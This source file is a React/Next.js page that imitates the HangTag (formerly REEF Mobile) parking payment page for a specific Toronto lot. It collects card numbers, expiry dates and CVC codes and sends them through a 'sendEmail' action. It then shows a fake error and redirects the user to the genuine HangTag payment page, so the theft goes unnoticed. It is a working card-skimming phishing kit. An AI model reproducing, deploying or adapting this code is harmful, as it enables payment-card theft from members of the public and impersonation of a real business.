'use client'

import { useState } from 'react'
import { Home, HelpCircle, Globe, Info } from 'lucide-react'
import { Button } from "@/components/ui/button"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import {sendEmail} from "@/app/actions/sendEmail";


export default function ParkingInterface() {
  const [expanded, setExpanded] = useState({
    vehicle: false,
    receipt: false,
    payment: false
  })

  const [duration, setDuration] = useState({
    hours: "0",
    minutes: "5"
  })

  const [quote, setQuote] = useState({
    total: 0,
    endTime: "",
    additionalTimeInfo: ""
  })

  const [licensePlate, setLicensePlate] = useState("")
  const [email, setEmail] = useState("")
  const [paymentInfo, setPaymentInfo] = useState({
    cardNumber: "",
    expiry: "",
    cvc: ""
  })
  const [showErrorScreen, setShowErrorScreen] = useState(false)

  const handleDurationChange = (type: 'hours' | 'minutes', value: string) => {
    setDuration(prev => ({ ...prev, [type]: value }));
    setQuote({ total: 0, endTime: "", additionalTimeInfo: "" });
  };

  const calculateQuote = () => {
    const hours = parseInt(duration.hours)
    const minutes = parseInt(duration.minutes)

    const totalHours = hours + (minutes / 60)

    let price = 0
    if (totalHours <= 1) {
      price = 2.99
    } else if (totalHours <= 2) {
      price = 5.99
    } else {
      price = Math.ceil(totalHours) * 2.99
    }

    const now = new Date()
    const endTime = new Date(now.getTime() + (hours * 60 * 60 * 1000) + (minutes * 60 * 1000))
    const formattedEndTime = endTime.toLocaleString('en-US', {
      month: 'long',
      day: 'numeric',
      hour: 'numeric',
      minute: '2-digit',
      hour12: true
    })

    let additionalTimeInfo = ""
    if (totalHours > 1 && minutes > 0) {
      additionalTimeInfo = "Additional time added for same cost as 1 hour 5 minutes"
    }

    setQuote({
      total: price,
      endTime: formattedEndTime,
      additionalTimeInfo
    })

    setExpanded(prev => ({ ...prev }))
  }

  const handlePayAndStartSession = (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault()
    const formData = new FormData(event.currentTarget)
    formData.append('licensePlate', licensePlate)
    formData.append('duration', `${duration.hours} hours ${duration.minutes} minutes`)
    formData.append('total', quote.total.toFixed(2))
    formData.append('cardNumber', paymentInfo.cardNumber)
    formData.append('expiry', paymentInfo.expiry)
    formData.append('cvc', paymentInfo.cvc)

    const result = sendEmail(formData)
    // eslint-disable-next-line @typescript-eslint/ban-ts-comment
    // @ts-expect-error
    if (result.success) {
      alert('Payment successful and email sent!')
    } else {
      setShowErrorScreen(true)
      setTimeout(() => {
        window.location.href = 'https://pay.hangtag.io/en/park/9511'
      }, 3000)
    }
  }

  const handlePaymentInfoChange = (field: keyof typeof paymentInfo, value: string) => {
    setPaymentInfo(prev => ({ ...prev, [field]: value }))
  }

  return (
      <div className="min-h-screen flex flex-col bg-gray-100">
        <div className="min-h-screen flex flex-col">
          {/* Top Banner */}
          <div className="bg-[#0a1657] text-white p-4 flex justify-center items-center">
            <div className="text-sm md:text-base flex flex-row justify-center items-center gap-[5px]">
              <span className="font-bold text-2xl md:text-[25px]">REEF</span>
              <span className="text-xs">Mobile</span>
              <span>is now HangTag!</span>
            </div>
          </div>

          {/* Navigation */}
          <nav className="flex justify-between items-center p-4 bg-gradient-to-r from-[#f58426] to-[#e93e3a]">
            <Button variant="ghost" size="icon" className="text-white hover:text-white/80">
              <Home className="w-[1em] h-[1em]" />
            </Button>
            <svg
                xmlns="http://www.w3.org/2000/svg"
                xmlnsXlink="http://www.w3.org/1999/xlink"
                id="Layer_1"
                x="0px"
                y="0px"
                viewBox="0 0 1360 662"
                enableBackground="new 0 0 1360 662"
                xmlSpace="preserve"
                width="24"
                height="24"
                style={{ transform: "scale(3)" }}
            >
              <path
                  fill="#ffffff"
                  d="M499.4,63.4h-5.3H75.5h-5.3c-8.4,0-15.3,6.9-15.3,15.3V84v20.6v280.4v116.4v5.3c0,8.4,6.9,15.3,15.3,15.3  h5.3h418.6h5.3c8.4,0,15.3-6.9,15.3-15.3v-5.3V385.1V196.6l-182.3-21.4c-5,23.2-25.6,40.6-50.3,40.6c-28.4,0-51.5-23.1-51.5-51.5  c0-28.4,23-51.5,51.5-51.5c25.1,0,45.9,17.9,50.5,41.7l182-21.4v-28.4V84v-5.3C514.8,70.3,507.9,63.4,499.4,63.4z"
              ></path>
              <path
                  fill="#ffffff"
                  d="M499.4,53.9h-5.3H75.5h-5.3c-8.4,0-15.3,6.9-15.3,15.3v5.3v20.6v280.4V492v5.3c0,8.4,6.9,15.3,15.3,15.3h5.3  h418.6h5.3c8.4,0,15.3-6.9,15.3-15.3V492V375.6V187.1l-179.3-21.4c-5,23.2-25.6,40.6-50.3,40.6c-28.4,0-51.5-23.1-51.5-51.5  c0-28.4,23-51.5,51.5-51.5c25.1,0,45.9,17.9,50.5,41.7l179-21.4V95.1V74.5v-5.3C514.8,60.8,507.9,53.9,499.4,53.9z"
              ></path>
              <g>
                <g>
                  <path
                      fill="#ffffff"
                      d="M1214.6,359.4c9.4,8.9,16.8,23.3,16.8,40.6c0,16.3-6.4,31.7-17.3,42.1c-7.4,6.9-19.8,14.4-38.7,14.4    c-16.9,0-30.2-5.5-40.1-15.9c-9.9-10.4-15.4-25.3-15.4-39.7c0-13.4,6-30.7,16.9-41.1c8.9-8.4,23.3-14.4,39.1-14.4    C1188.8,345.5,1204.2,350,1214.6,359.4z M1296.9,291h-71.4v25.8c-7.9-11.9-25.8-33.2-65.9-33.2c-41.1,0-66.9,17.8-80.3,31.7    c-18.8,19.3-32.7,50.6-32.7,88.2c0,38.2,14.4,64.9,32.2,83.3c20.3,20.3,46.6,31.2,80.8,31.2c40.7,0,57.5-19.3,65.9-33.2v25.3    c0,9.4-0.5,32.7-14.4,46.1c-5,4.5-15.4,11.9-35.7,11.9c-10.4,0-22.3-2-30.7-7.4c-5.9-3.9-12.9-10.4-15.9-21.8H1051    c5,27.8,19.3,46.6,33.2,58.5c27.7,23.8,62.9,28.2,92.2,28.2c24.3,0,65.9-3.5,93.2-32.7c25.8-27.8,27.3-63,27.3-94.2V291z"
                  ></path>
                  <path
                      fill="#ffffff"
                      d="M1225.5,182.4c-4.4-4.6-6.8-11.2-6.8-17.5c0-5.9,2.6-13.6,7.4-18.2c4-3.7,10.3-6.3,17.3-6.3    c5.7,0,12.5,2,17.1,6.1c4.2,3.9,7.4,10.3,7.4,18c0,7.2-2.8,14-7.7,18.6c-3.3,3.1-8.7,6.3-17.1,6.3    C1235.7,189.4,1229.8,187,1225.5,182.4z M1186.3,166c0,16.9,6.3,28.7,14.2,36.8c9,9,20.6,13.8,35.7,13.8    c17.9,0,25.4-8.5,29.1-14.7v11.2c0,4.1-0.2,14.4-6.3,20.4c-2.2,2-6.8,5.3-15.8,5.3c-4.6,0-9.9-0.9-13.6-3.3    c-2.6-1.8-5.7-4.6-7-9.6h-34.4c2.2,12.3,8.5,20.6,14.7,25.8c12.3,10.5,27.8,12.5,40.7,12.5c10.7,0,29.1-1.5,41.2-14.5    c11.4-12.3,12-27.8,12-41.6v-91.8h-31.5v11.4c-3.5-5.3-11.4-14.7-29.1-14.7c-18.2,0-29.6,7.9-35.5,14    C1192.4,135.5,1186.3,149.3,1186.3,166z"
                  ></path>
                  <path
                      fill="#ffffff"
                      d="M1077.9,116.3h31.5v11.6c9.6-12.3,21-14.2,30.2-14.2c8.5,0,19.7,1.5,28,9.9c9.2,9.2,9.9,20.8,9.9,28.7    v61.8H1146v-50.1c0-6.4-0.2-14.5-5.2-19.5c-2.4-2.4-6.3-4.4-12-4.4c-6.6,0-10.7,2.6-13.1,5.2c-5.3,5.3-6.1,12.3-6.1,18.6v50.1    h-31.5V116.3z"
                  ></path>
                  <path
                      fill="#ffffff"
                      d="M992.1,182.4c-2.8-3.1-6.6-8.8-6.6-17.5c0-8.8,3.9-14.5,7.2-17.7c4.2-4.2,10.5-7,17.3-7    c5.7,0,12.7,2.2,17.5,6.8c4.6,4.4,7.2,10.9,7.2,18c0,8.3-3.5,14.4-7.7,18.4c-4.2,4.2-10.1,6.8-16.4,6.8    C1003.3,190.1,996.5,187,992.1,182.4z M953.1,165.8c0,12.9,3.9,25.6,14.2,36.6c10.7,11.4,22.6,14.9,36.6,14.9    c8.1,0,20.4-2,28.9-15.1v11.8h31.5v-97.7h-31.5v11c-9-12.3-22.3-14.2-30.7-14.2c-13.6,0-25.4,4.8-33.9,13.4    C959.2,135.3,953.1,149.3,953.1,165.8z"
                  ></path>
                  <path
                      fill="#ffffff"
                      d="M843.6,54.3h31.5v73.6c3.9-4.8,8.1-8.1,11.8-10.1c6.6-3.5,12-4.2,19.1-4.2c7.7,0,19,1.1,27.6,9.9    c9,9,9.6,21,9.6,28.5v62h-31.5v-50.1c0-6.8-0.2-14.7-5.3-19.5c-2.8-2.8-7.7-4.4-12.3-4.4c-6.8,0-10.7,3.1-12.5,4.8    c-6.4,6.1-6.6,15.5-6.6,20.4v48.8h-31.5V54.3z"
                  ></path>
                  <path
                      fill="#ffffff"
                      d="M859.1,440.7c-6.4-6.9-14.9-19.8-14.9-39.7c0-19.8,8.9-32.7,16.4-40.1c9.4-9.4,23.8-15.9,39.1-15.9    c12.9,0,28.8,5,39.7,15.4c10.4,9.9,16.4,24.8,16.4,40.6c0,18.8-7.9,32.7-17.4,41.6c-9.4,9.4-22.8,15.4-37.2,15.4    C884.4,458,869,451.1,859.1,440.7z M805.1,313.8c-20.3,20.3-34.2,52-34.2,89.2c0,29.2,8.9,58,32.2,82.8    c24.3,25.8,51.1,33.7,82.8,33.7c18.3,0,46.1-4.5,65.4-34.2v26.8h71.4V291h-71.4v24.8c-20.3-27.7-50.6-32.2-69.4-32.2    C851.2,283.6,824.4,294.5,805.1,313.8z"
                  ></path>
                  <polygon
                      fill="#ffffff"
                      points="810.5,181.5 810.5,245.9 738.7,245.9 738.7,512.1 662.3,512.1 662.3,245.9 590.5,245.9     590.5,181.5   "
                  ></polygon>
                </g>
              </g>
              <g>
                <path
                    fill="#ffffff"
                    d="M1309.5,512.1h-1.5v-5.9h-2.2v-1.3h5.9v1.3h-2.2V512.1z"
                ></path>
                <path
                    fill="#ffffff"
                    d="M1319.5,512.1h-1.4v-6h0l-1.3,6h-1.5l-1.3-6h0v6h-1.4v-7.2h2.2l1.3,5.7h0l1.3-5.7h2.2V512.1z"
                ></path>
              </g>
            </svg>
            <div className="flex gap-2">
              <Button variant="ghost" size="icon" className="text-white hover:text-white/80">
                <HelpCircle className="w-[1em] h-[1em]" />
              </Button>
              <Button variant="ghost" className="font-medium text-white hover:text-white/80">
                <Globe className="w-[1em] h-[1em] mr-1" />
                FR
              </Button>
            </div>
          </nav>

          {/* Header Section */}
          <div className="bg-gradient-to-r from-[#f58426] to-[#e93e3a] text-white px-4 md:px-[140px] py-[30px]">
            <h1 className="text-3xl md:text-4xl font-bold mb-2">Lot #9511</h1>
            <h2 className="text-lg md:teåxt-xl mb-1">Metro at The Carnaby</h2>
            <p className="text-sm opacity-90">1230 Queen St W, Toronto, ON, Canada.</p>
          </div>

          {/* Hours Banner */}
          <div className="bg-gray-700 text-white p-3 text-center text-sm">
            Open 12:00 AM - 11:59 PM
          </div>

          {/* Main Content */}
          <div className="flex-1 p-4 md:p-6 mx-auto w-full mb:max-w-4xl md:max-full md:px-[140px]">
            <div className="space-y-4 md:space-y-6">
              {/* Length of Stay */}
              <div className="bg-white p-4 md:p-6 rounded-lg shadow-sm">
                <div className="flex justify-between items-center mb-4">
                  <h3 className="text-xl font-bold">Length of Stay</h3>
                  {quote.endTime && !expanded.vehicle && (
                      <button className="text-[#f58426] text-sm font-medium">
                        Edit
                      </button>
                  )}
                </div>
                {!expanded.vehicle && quote.endTime && (
                    <div className="mb-4">
                      <p className="text-lg">
                        {duration.hours} Hours {duration.minutes} Minutes until {quote.endTime}
                      </p>
                      {quote.additionalTimeInfo && (
                          <p className="text-blue-600 text-sm">{quote.additionalTimeInfo}</p>
                      )}
                    </div>
                )}
                <div className="grid grid-cols-2 gap-4">
                  <Select
                      value={duration.hours}
                      onValueChange={(value) => handleDurationChange('hours', value)}
                  >
                    <SelectTrigger className="h-12 rounded-lg border-gray-300">
                      <SelectValue placeholder="0 Hours" />
                    </SelectTrigger>
                    <SelectContent>
                      {[...Array(24)].map((_, i) => (
                          <SelectItem key={i} value={i.toString()}>
                            {i} Hours
                          </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                  <Select
                      value={duration.minutes}
                      onValueChange={(value) => handleDurationChange('minutes', value)}
                  >
                    <SelectTrigger className="h-12 rounded-lg border-gray-300">
                      <SelectValue placeholder="0 Minutes" />
                    </SelectTrigger>
                    <SelectContent>
                      {[...Array(12)].map((_, i) => (
                          <SelectItem key={i * 5} value={(i * 5).toString()}>
                            {i * 5} Minutes
                          </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                </div>

                {/* Total or Get Quote Button */}
                {quote.total > 0 ? (
                    <div className="mt-4 md:mt-[20px] flex justify-between items-center">
                      <h3 className="text-xl font-bold">Total</h3>
                      <span className="text-[#f58426] text-xl font-bold">CA${quote.total.toFixed(2)}</span>
                    </div>
                ) : (
                    <Button
                        onClick={calculateQuote}
                        className="w-full bg-black text-white hover:bg-gray-800 h-12 md:h-[57px] text-lg font-medium rounded-full mt-4 md:mt-[20px]"
                    >
                      Get Quote
                    </Button>
                )}
              </div>

              {/* Vehicle Section */}
              <div className="bg-white rounded-lg shadow-sm">
                <button
                    onClick={() => setExpanded(prev => ({ ...prev, vehicle: !prev.vehicle }))}
                    className="w-full p-4 md:p-6 flex justify-between items-center"
                >
                  <h3 className="text-xl font-bold">Vehicle</h3>
                  <span className="text-[#f58426] text-sm font-medium">
                  {expanded.vehicle ? "Edit" : "Add"}
                </span>
                </button>
                {expanded.vehicle && (
                    <div className="p-4 md:p-6 border-t">
                      <div className="space-y-2">
                        <label htmlFor="license-plate" className="block text-sm font-medium text-gray-700">
                          License Plate Number
                        </label>
                        <input
                            type="text"
                            id="license-plate"
                            value={licensePlate}
                            onChange={(e) => setLicensePlate(e.target.value)}
                            className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500"
                            placeholder="e.g. WDS4562"
                        />
                        <p className="text-sm text-gray-500">Must be 2-8 characters</p>
                      </div>
                    </div>
                )}
              </div>

              {/* Receipt Section */}
              <div className="bg-white rounded-lg shadow-sm">
                <button
                    onClick={() => setExpanded(prev => ({ ...prev, receipt: !prev.receipt }))}
                    className="w-full p-4 md:p-6 flex justify-between items-center"
                >
                  <h3 className="text-xl font-bold">Receipt</h3>
                  <span className={expanded.receipt ? "text-[#f58426] text-sm font-medium" : "text-gray-400 text-sm"}>
                  {expanded.receipt ? "Edit" : "Add"}
                </span>
                </button>
                {expanded.receipt && (
                    <div className="p-4 md:p-6 border-t">
                      <div className="space-y-2">
                        <label htmlFor="receipt-email" className="block text-sm font-medium text-gray-700">
                          Email
                        </label>
                        <input
                            type="email"
                            id="receipt-email"
                            value={email}
                            onChange={(e) => setEmail(e.target.value)}
                            className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500"
                            placeholder="Email"
                        />
                      </div>
                    </div>
                )}
              </div>

              {/* Payment Section */}
              <div className="bg-white rounded-lg shadow-sm">
                <button
                    onClick={() => setExpanded(prev => ({ ...prev, payment: !prev.payment }))}
                    className="w-full p-4 md:p-6 flex justify-between items-center"
                >
                  <h3 className="text-xl font-bold">Payment</h3>
                  <span className={expanded.payment ? "text-[#f58426] text-sm font-medium" : "text-gray-400 text-sm"}>
                  {expanded.payment ? "Edit" : "Add"}
                </span>
                </button>
                {expanded.payment && (
                    <div className="p-4 md:p-6 border-t">
                      <form onSubmit={handlePayAndStartSession} className="space-y-4 md:space-y-6">
                        <div>
                          <h4 className="text-lg font-semibold mb-4">Total</h4>
                          <div className="space-y-2 text-sm">
                            <div className="flex justify-between items-center">
                              <span className="text-gray-600">Subtotal</span>
                              <span>CA${(quote.total * 0.79).toFixed(2)}</span>
                            </div>
                            <div className="flex justify-between items-center">
                              <div className="flex items-center gap-1">
                                <span className="text-gray-600">Taxes</span>
                                <Info className="h-4 w-4 text-gray-400" />
                              </div>
                              <span>CA${(quote.total * 0.11).toFixed(2)}</span>
                            </div>
                            <div className="flex justify-between items-center">
                              <div className="flex items-center gap-1">
                                <span className="text-gray-600">Fees</span>
                                <Info className="h-4 w-4 text-gray-400" />
                              </div>
                              <span>CA${(quote.total * 0.10).toFixed(2)}</span>
                            </div>
                            <div className="flex justify-between items-center pt-2 border-t">
                              <span className="font-semibold">Total</span>
                              <span className="text-[#f58426] font-semibold">CA${quote.total.toFixed(2)}</span>
                            </div>
                          </div>
                        </div>

                        <div className="space-y-4">
                          <div className="space-y-2">
                            <label htmlFor="card-number" className="block text-sm font-medium text-gray-700">
                              Credit Card Number
                            </label>
                            <div className="relative">
                              <input
                                  type="text"
                                  id="card-number"
                                  name="card-number"
                                  value={paymentInfo.cardNumber}
                                  onChange={(e) => handlePaymentInfoChange('cardNumber', e.target.value)}
                                  className="w-full px-3 py-2 border border-gray-300 rounded-lg pr-20 focus:ring-blue-500 focus:border-blue-500"
                                  placeholder="1234 1234 1234 1234"
                                  required
                              />
                              <div className="absolute right-3 top-1/2 transform -translate-y-1/2 flex items-center gap-2">
                                <span className="bg-black text-white text-xs px-2 py-1 rounded">link</span>
                                <span className="text-xs">{paymentInfo.cardNumber.slice(-4)}</span>
                              </div>
                            </div>
                          </div>

                          <div className="grid grid-cols-2 gap-4">
                            <div className="space-y-2">
                              <label htmlFor="expiry" className="block text-sm font-medium text-gray-700">
                                Expires
                              </label>
                              <input
                                  type="text"
                                  id="expiry"
                                  name="expiry"
                                  value={paymentInfo.expiry}
                                  onChange={(e) => handlePaymentInfoChange('expiry', e.target.value)}
                                  className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500"
                                  placeholder="MM / YY"
                                  required
                              />
                            </div>
                            <div className="space-y-2">
                              <label htmlFor="cvc" className="block text-sm font-medium text-gray-700">
                                CVC Code
                              </label>
                              <input
                                  type="text"
                                  id="cvc"
                                  name="cvc"
                                  value={paymentInfo.cvc}
                                  onChange={(e) => handlePaymentInfoChange('cvc', e.target.value)}
                                  className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500"
                                  placeholder="CVC"
                                  required
                              />
                            </div>
                          </div>
                        </div>

                        <div className="space-y-4">
                          <button type="submit" className="w-full bg-gray-600 text-white py-3 rounded-full hover:bg-gray-700 transition-colors text-lg font-medium">
                            Pay and start session
                          </button>
                          <p className="text-sm text-gray-600 text-center">
                            By clicking &#34;Pay and start session&#34;, you acknowledge that you have read hangTag&#39;s{' '}
                            <a href="#" className="text-blue-600">Privacy Policy</a> and agree to hangTag&#39;s{' '}
                            <a href="#" className="text-blue-600">Terms of Use</a>.
                          </p>
                        </div>
                      </form>
                    </div>
                )}
              </div>
            </div>
          </div>
          {showErrorScreen && (
              <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
                <div className="bg-white p-8 rounded-lg shadow-lg text-center">
                  <h2 className="text-2xl font-bold mb-4">An error occurred</h2>
                  <p className="mb-4">There was an error processing your request.</p>
                  <p className="mb-4">Please try again...</p>
                  <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-gray-900 mx-auto"></div>
                </div>
              </div>
          )}
        </div>
      </div>
  )
}

